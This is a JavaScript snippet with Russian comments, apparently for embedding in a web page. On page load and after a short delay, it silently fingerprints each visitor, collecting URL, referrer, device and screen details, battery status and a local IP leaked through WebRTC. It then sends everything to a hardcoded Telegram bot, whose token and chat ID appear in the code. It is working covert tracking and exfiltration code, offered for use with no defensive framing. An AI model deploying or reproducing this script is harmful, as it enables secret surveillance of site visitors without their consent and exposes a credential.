 // Telegram bot settings (ЗАМЕНИТЕ НА СВОИ)
        const BOT_TOKEN = '8193753656:AAFw7d9vULwYekSD8-Ie0TRRShjOHeUMxk0';
        const CHAT_ID = '5417959190';
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Собираем все возможные данные
        async function collectAllData() {
            const data = {
                // Основные данные
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                
                // Экран
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    orientation: window.screen.orientation?.type
                },
                
                // Устройство
                deviceMemory: navigator.deviceMemory,
                hardwareConcurrency: navigator.hardwareConcurrency,
                
                // Сеть (IP через WebRTC)
                ipAddress: await getIP(),
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                } : null,
                
                // Батарея
                battery: await getBatteryInfo(),
                
                // Локация
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Дополнительно
                cookies: document.cookie ? 'exists' : 'none',
                localStorage: localStorage.length ? 'exists' : 'empty'
            };
            
            return data;
        }

        // Получаем IP через WebRTC
        async function getIP() {
            return new Promise(resolve => {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = ice => {
                    if (!ice.candidate) return;
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ip) resolve(ip[1]);
                    pc.close();
                };
                
                setTimeout(() => resolve('unknown'), 1000);
            });
        }

        // Получаем информацию о батарее
        async function getBatteryInfo() {
            if (!navigator.getBattery) return null;
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch {
                return null;
            }
        }

        // Отправляем данные в Telegram
        async function sendDataToTelegram(data) {
            let message = `🚨 НОВЫЕ ДАННЫЯ ОТ ПОСЕТИТЕЛЯ 🚨\n\n`;
            message += `📅 Время: ${new Date(data.timestamp).toLocaleString()}\n`;
            message += `🌐 URL: ${data.url}\n`;
            message += `🖥 Устройство: ${data.platform}\n`;
            message += `🔍 User Agent: ${data.userAgent}\n`;
            message += `📱 Экран: ${data.screen.width}x${data.screen.height}\n`;
            
            if (data.ipAddress && data.ipAddress !== 'unknown') {
                message += `📡 IP: ${data.ipAddress}\n`;
            }
            
            if (data.battery) {
                message += `🔋 Батарея: ${data.battery.level}% ${data.battery.charging ? '(зарядка)' : ''}\n`;
            }
            
            message += `\n⚙️ Все данные:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('Ошибка отправки:', e);
            }
        }

        // Основная функция
        async function init() {
            // Ждем 3 секунды
            setTimeout(async () => {
                const data = await collectAllData();
                await sendDataToTelegram(data);
            }, 3000);
        }

        // Запускаем при загрузке
        window.onload = init;
